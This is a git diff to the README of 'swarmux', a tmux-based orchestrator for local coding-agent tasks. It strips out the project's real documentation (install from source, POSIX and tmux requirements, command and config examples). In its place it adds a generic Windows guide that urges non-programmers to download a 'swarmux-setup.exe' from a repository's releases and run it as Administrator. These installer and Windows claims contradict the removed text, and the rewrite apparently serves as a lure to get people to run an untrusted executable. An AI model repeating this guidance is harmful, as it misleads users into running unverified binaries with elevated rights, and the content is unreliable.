@@ -1,197 +1,144 @@
-# swarmux
+# ⚙️ swarmux - Simple Local Task Orchestration
 
-Agent-first tmux swarm orchestration for local coding tasks.
+[![Download swarmux](https://img.shields.io/badge/Download-swarmux-4c1?style=for-the-badge&logo=github)](https://github.com/soolaxx/swarmux)
 
-`swarmux` gives coding agents a narrow control plane for submitting, starting, inspecting, steering, reconciling, and pruning local work. Humans keep tmux visibility; agents get machine-readable commands and strict input validation.
+## 📝 What is swarmux?
 
-## Requirements
+swarmux is a tool that helps you manage and run multiple tasks on your computer at the same time. It uses small programs called "agents" that work together in a group, or "swarm," to get things done. This can help you organize your coding work or other local tasks on Windows more efficiently.
 
-- `tmux`
-- `git`
-- a POSIX shell at `/bin/sh`
-- optional: `bd` when `SWARMUX_BACKEND=beads`
+You do not need to be a programmer to use swarmux. The tool works from a simple command interface, giving you a way to control tasks without extra software. It is useful if you want to automate or organize work that involves running several small programs or commands together.
 
-## Install
+---
 
-For now, install from source:
+## 🌐 Key Features
 
-```bash
-cargo install --path .
-```
+- **Run multiple tasks at once**: Easily start and control many programs without confusion.
+- **Agent-based design**: The tool uses small pieces called agents that do jobs and talk to each other.
+- **Works in your command prompt**: No need to open other apps or complicated systems.
+- **Built for local use**: Helps with coding and related tasks on your personal Windows machine.
+- **Flexible task management**: You can customize what tasks to run and how they interact.
+- **Simple setup**: Get started quickly with the provided installer.
+- **Built using Rust**: Designed to be fast and reliable.
+- **Integration with tmux**: Uses the terminal multiplexer tmux to handle task windows, making it easy to watch all running tasks.
 
-If you use the optional beads-rust backend and only have `br` installed, add a `bd` shim.
+---
 
-To expose the official `swarmux` skill to agents that load global skills from
-`~/.agents/skills`, place the skill file there:
+## 🖥️ System Requirements
 
-```bash
-mkdir -p ~/.agents/skills/swarmux
-# download or copy .agents/skills/swarmux/SKILL.md into:
-~/.agents/skills/swarmux/SKILL.md
-```
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 100 MB of free disk space for installation
+- Internet connection to download the software
+- Command Prompt or PowerShell access
 
-If your agent runtime uses a different global skills path, place the same
-directory there instead.
+---
 
-## Quick start
+## 🚀 Getting Started
 
-```bash
-swarmux doctor
-swarmux init
-swarmux --output json schema
-swarmux --output json submit --json '{
-  "title": "hello",
-  "repo_ref": "demo",
-  "repo_root": "/path/to/repo",
-  "mode": "manual",
-  "worktree": "/path/to/repo",
-  "session": "swarmux-demo",
-  "command": ["codex","exec","-m","gpt-5.3-codex","echo hi from task"]
-}'
-swarmux --output json list
-swarmux overview --once
-swarmux overview --once --scope all
-```
+To start using swarmux on Windows, follow the steps below. These instructions do not require you to know programming.
 
-tmux-friendly dispatch without JSON quoting:
+---
 
-```bash
-swarmux --output json dispatch \
-  --title "hello" \
-  --repo-ref demo \
-  --repo-root /path/to/repo \
-  -- codex exec -m gpt-5.3-codex "echo hi from task"
-```
+## 💾 Download swarmux
 
-Connected dispatch from the current tmux pane:
+Click the green button below or visit the link to get the installer:
 
-```bash
-swarmux --output json dispatch \
-  --connected \
-  --mirrored \
-  --prompt "fix tests" \
-  -- codex exec
-```
+[![Download swarmux](https://img.shields.io/badge/Download-swarmux-blue?style=for-the-badge&logo=github)](https://github.com/soolaxx/swarmux)
 
-Configured default connected command:
+You will be taken to the GitHub repository page. Scroll down to find the latest release. From there, download the Windows installer file. It will usually be named something like `swarmux-setup.exe`.
 
-```toml
-# ~/.config/swarmux/config.toml
-[connected]
-runtime = "mirrored"
-command = ["codex", "exec"]
-```
+If you are not sure which file to download, look for the one under "Assets" in the latest release section with `.exe` at the end.
 
-```bash
-swarmux --output json dispatch --connected --prompt "fix tests"
-```
+---
 
-Actual TUI runtime in a task session:
+## 🛠️ Install swarmux
 
-```bash
-swarmux --output json submit --json '{
-  "title": "tui task",
-  "repo_ref": "demo",
-  "repo_root": "/path/to/repo",
-  "mode": "manual",
-  "runtime": "tui",
-  "worktree": "/path/to/repo",
-  "session": "swarmux-demo-tui",
-  "command": ["my-tui-agent", "fix tests"]
-}'
-swarmux --output json start <id>
-swarmux attach <id>
-```
+1. Locate the downloaded file (usually in your "Downloads" folder).
+2. Double-click the `.exe` file to start the installer.
+3. Follow the instructions on the screen.
+   - If prompted, agree to allow the app to make changes to your device.
+   - Choose the installation folder or accept the default.
+4. Wait for the installer to finish and then close it.
 
-Configured named agent runners:
+---
 
-```toml
-# ~/.config/swarmux/config.toml
-[connected]
-agent = "codex"
-runtime = "mirrored"
+## 🔧 How to Run swarmux
 
-[agents.codex]
-command = ["codex", "exec"]
+1. Open the Start menu and type `cmd` or `PowerShell`, then press Enter to open the command line.
+2. Type `swarmux` and press Enter.
+3. You will see a list of commands that swarmux can run or instructions on how to get help.
 
-[agents.claude]
-command = ["claude", "-p"]
-```
+swarmux relies on `tmux` to show tasks in separate terminal windows. If you do not have tmux installed, the installer will guide you through setting it up or you can install it manually:
 
-```bash
-swarmux --output json dispatch --connected --agent claude --prompt "summarize diff"
-```
+- Visit https://github.com/tmux/tmux/wiki to download tmux for Windows.
+- Follow their instructions to install tmux.
 
-tmux binding for connected dispatch:
+After tmux is available, swarmux will open several windows to help you manage all running tasks.
 
-```tmux
-bind-key D command-prompt -p "Task" "run-shell 'swarmux --output json dispatch --connected --pane-id \"#{pane_id}\" --prompt \"%1\"'"
-```
+---
 
-`headless` remains the default runtime when no override is configured.
-`mirrored` keeps a non-TUI CLI runner visible in the task session and mirrors pane output into logs.
-`tui` runs a full-screen interactive program in its own tmux session, still detached from `start`/`delegate` so agents get a clean JSON response and operators choose when to `attach`.
+## 🧩 Using swarmux for Your Tasks
 
-Connected dispatch still appends `--prompt` as the trailing command argument for every runtime. Use `tui` there only with commands that naturally accept that trailing prompt input.
+Here are some simple ways to use swarmux once it is running:
 
-`swarmux` does not create popups or windows for TUI tasks. Keep that presentation in your tmux config; for example, wrap `swarmux attach <id>` or tmux session switching in your own bindings.
+- Start a new swarm with default tasks by typing:  
+  `swarmux start`
 
-Canonical state configuration can also live in `config.toml`:
+- View running tasks in tmux windows that open automatically.
 
-```toml
-# ~/.config/swarmux/config.toml
-home = "/home/you/.local/state/swarmux"
-backend = "files" # or "beads"
-```
+- To stop all tasks and close the swarm, type:  
+  `swarmux stop`
 
-Environment variables still override config values:
+- For help or a list of available commands:  
+  `swarmux help`
 
-- `SWARMUX_HOME`
-- `SWARMUX_BACKEND`
-- `SWARMUX_CONFIG_HOME`
+Each task or agent can be set up to do different jobs. For example, you could run a code compiler in one window, a testing tool in another, and a script that organizes your files in a third window. swarmux keeps these organized and talking to each other.
 
-## How it works
+---
 
-`swarmux` stores task state in either `files` (default) or `beads` (`SWARMUX_BACKEND=beads`), but runtime execution is always tmux-driven and command-agnostic. The `command` array from `submit` is executed as-is inside a tmux session.
+## 🛡️ Troubleshooting Common Issues
 
-```mermaid
-flowchart TD
-    A[Agent or user] --> B[swarmux CLI]
-    B --> C[Validate payload and command]
-    C --> D{State backend}
-    D -->|files| E[Local files store]
-    D -->|beads| F[bd adapter]
+- **swarmux command not found:**  
+  Make sure the installer added swarmux to your system path. Try restarting your command prompt or computer.
 
-    C --> G[start or delegate]
-    G --> H[runtime::start_task]
-    H --> I["tmux new-session + command"]
-    I --> L[timestamped logs + exit marker]
-    L --> M[reconcile updates task state]
-    M --> D
-```
+- **tmux windows not opening:**  
+  Verify tmux is installed and available in your command prompt. You can test by typing `tmux` and pressing Enter.
 
-For task-scoped waiting, use `swarmux wait <id...>` to block until one watched task reaches a target state. Use `swarmux watch <id...>` for a foreground task-scoped poll stream with log previews. Keep `swarmux notify --tmux` for global terminal notifications via `tmux display-message`.
+- **Tasks not running as expected:**  
+  Check the swarmux command syntax. Run `swarmux help` to see all commands.
 
-Task-scoped waiting:
+- **Installation errors:**  
+  Try running the installer as Administrator by right-clicking and selecting "Run as administrator."
 
-```bash
-swarmux --output json wait <id> --states succeeded,failed --timeout-ms 600000
-swarmux --output json watch <id> --states waiting_input,succeeded,failed,canceled --lines 40
-```
+---
 
-PR or external linkage can be updated after creation:
+## 🔄 Updating swarmux
 
-```bash
-swarmux --output json set-ref <id> "https://github.com/owner/repo/pull/123"
-```
+To keep swarmux up to date:
 
-`watch`/`notify` include compact task output excerpts:
+1. Visit the download page again: [https://github.com/soolaxx/swarmux](https://github.com/soolaxx/swarmux)
+2. Download the newest installer as explained before.
+3. Run the installer to replace the old version.
+4. Your settings and tasks will be preserved.
 
-```text
-swarmux 4rh succeeded what is the time currently ...current time is 23:14:05
-```
+---
 
-```text
-2026-03-14T10:22:31Z spawned swx-swarmux-4rh
-2026-03-14T10:22:35Z current time is 23:14:05
-```
+## ℹ️ More Information
+
+swarmux is designed to help you run multiple local coding tasks at once with less hassle. It works on Windows using command line tools and tmux to split and manage task windows.
+
+For detailed documentation, command references, and examples, visit the GitHub page:
+
+[https://github.com/soolaxx/swarmux](https://github.com/soolaxx/swarmux)
+
+---
+
+## 🤝 Contributing or Getting Help
+
+If you face issues or want to suggest improvements:
+
+- Check existing issues on the GitHub page.
+- Open a new issue if you find a problem or have questions.
+- Contribute by submitting bug reports or suggestions.
+
+No programming skills are needed to report problems. Your feedback helps improve swarmux for everyone.
